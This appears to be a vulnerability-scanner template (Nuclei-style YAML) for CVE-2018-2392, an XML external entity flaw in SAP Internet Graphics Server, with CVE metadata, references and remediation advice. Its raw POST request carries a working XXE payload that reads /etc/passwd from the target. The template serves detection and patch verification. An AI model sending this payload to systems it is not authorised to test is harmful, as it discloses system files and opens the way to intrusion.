http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - Picture
    - Info
    - /output/
  - condition: or
    part: body
    type: word
    words:
    - ImageMap
    - Errors
  - condition: and
    part: header
    type: word
    words:
    - text/html
    - SAP Internet Graphics Server
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - "POST /XMLCHART HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data;\
    \ boundary={{randstr_1}}\n\n--{{randstr_1}}\nContent-Disposition: form-data; name=\"\
    {{randstr_2}}\"; filename=\"{{randstr_3}}.xml\"\nContent-Type: application/xml\n\
    \n<?xml version='1.0' encoding='UTF-8'?>\n    <ChartData>\n      <Categories>\n\
    \        <Category>ALttP</Category>\n      </Categories>\n      <Series label=\"\
    {{randstr_4}}\">\n        <Point>\n          <Value type=\"y\">12345</Value>\n\
    \        </Point>\n      </Series>\n    </ChartData>\n--{{randstr_1}}\nContent-Disposition:\
    \ form-data; name=\"{{randstr_5}}\"; filename=\"{{randstr_6}}.xml\"\nContent-Type:\
    \ application/xml\n\n<?xml version='1.0' encoding='UTF-8'?>\n    <!DOCTYPE Extension\
    \ [<!ENTITY xxe SYSTEM \"/etc/passwd\">]>\n    <SAPChartCustomizing version=\"\
    1.1\">\n      <Elements>\n        <ChartElements>\n          <Title>\n       \
    \     <Extension>&xxe;</Extension>\n          </Title>\n        </ChartElements>\n\
    \      </Elements>\n    </SAPChartCustomizing>\n--{{randstr_1}}--\n"
id: CVE-2018-2392
info:
  author: _generic_human_
  classification:
    cpe: cpe:2.3:a:sap:internet_graphics_server:7.20:*:*:*:*:*:*:*
    cve-id: CVE-2018-2392
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    cvss-score: 7.5
    cwe-id: CWE-611
    epss-percentile: 0.99401
    epss-score: 0.86959
  description: 'SAP Internet Graphics Servers (IGS) running versions 7.20, 7.20EXT,
    7.45, 7.49, or 7.53 has two XML external entity injection (XXE) vulnerabilities
    within the XMLCHART page - CVE-2018-2392 and CVE-2018-2393. These vulnerabilities
    occur due to a lack of appropriate validation on the Extension HTML tag when submitting
    a POST request to the XMLCHART page to generate a new chart.

    '
  impact: 'Successful exploitation of this vulnerability can lead to unauthorized
    access to sensitive information or a complete system compromise.

    '
  metadata:
    max-request: 1
    product: internet_graphics_server
    vendor: sap
  name: SAP Internet Graphics Server (IGS) - XML External Entity Injection
  reference:
  - https://launchpad.support.sap.com/#/notes/2525222
  - https://blogs.sap.com/2018/02/13/sap-security-patch-day-february-2018/
  - https://www.rapid7.com/db/modules/auxiliary/admin/sap/sap_igs_xmlchart_xxe/
  - https://troopers.de/troopers18/agenda/3r38lr/
  - https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/admin/sap/sap_igs_xmlchart_xxe.rb
  - https://nvd.nist.gov/vuln/detail/CVE-2018-2392
  remediation: 'Apply the latest security patches and updates provided by SAP to mitigate
    this vulnerability. Additionally, ensure that the SAP Internet Graphics Server
    (IGS) is not exposed to untrusted networks or the internet.

    '
  severity: high
  tags: cve,cve2018,sap,igs,xxe,xmlchart,msf,intrusive,vkev,vuln
